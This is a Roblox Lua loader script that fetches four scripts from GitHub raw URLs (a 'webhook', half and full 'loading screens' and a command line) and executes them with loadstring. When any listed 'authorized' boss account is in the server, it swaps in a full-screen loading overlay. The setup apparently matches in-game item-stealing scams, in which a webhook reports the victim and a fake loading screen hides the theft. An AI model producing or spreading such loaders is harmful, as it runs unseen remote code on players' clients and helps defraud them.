-- Simple Main Loader - Just Combines Your Working Scripts
local scriptUrls = {
    webhook = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook",
    halfLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", 
    fullLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading",
    cmdLine = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"
}

print("ðŸš€ Starting Simple Main Loader...")

-- Load webhook
loadstring(game:HttpGet(scriptUrls.webhook))()
print("âœ… Webhook loaded")

-- Load half loading screen (starts automatically)
loadstring(game:HttpGet(scriptUrls.halfLoading))()
print("âœ… Half loading screen started")

-- Load command line
loadstring(game:HttpGet(scriptUrls.cmdLine))()
print("âœ… Command line loaded")

-- Simple authorized user detection
local authorizedUsers = {
    "jaatshab_770", "III",
    "boss_user2", "BOSS2", 
    "boss_user3", "BOSS3",
    "boss_user4", "BOSS4",
    "boss_user5", "BOSS5"
}

-- Function to switch to full loading
local function switchToFullLoading()
    print("ðŸ”„ Switching to full loading screen...")
    
    -- Remove half loading screen
    local playerGui = game.Players.LocalPlayer.PlayerGui
    if playerGui:FindFirstChild("ProfessionalLoadingScreen") then
        playerGui.ProfessionalLoadingScreen:Destroy()
        print("âœ… Half loading removed")
    end
    
    -- Load full loading screen
    loadstring(game:HttpGet(scriptUrls.fullLoading))()
    print("âœ… Full loading screen activated")
end

-- Check when players join
game.Players.PlayerAdded:Connect(function(player)
    for _, authUser in pairs(authorizedUsers) do
        if player.Name == authUser or player.DisplayName == authUser then
            print("ðŸŽ¯ Authorized user joined: " .. player.Name)
            wait(2)
            switchToFullLoading()
            break
        end
    end
end)

-- Check existing players
for _, player in pairs(game.Players:GetPlayers()) do
    for _, authUser in pairs(authorizedUsers) do
        if player.Name == authUser or player.DisplayName == authUser then
            print("ðŸŽ¯ Authorized user already here: " .. player.Name)
            wait(2)
            switchToFullLoading()
            break
        end
    end
end

print("ðŸ“‹ Loader ready! Waiting for authorized users...")
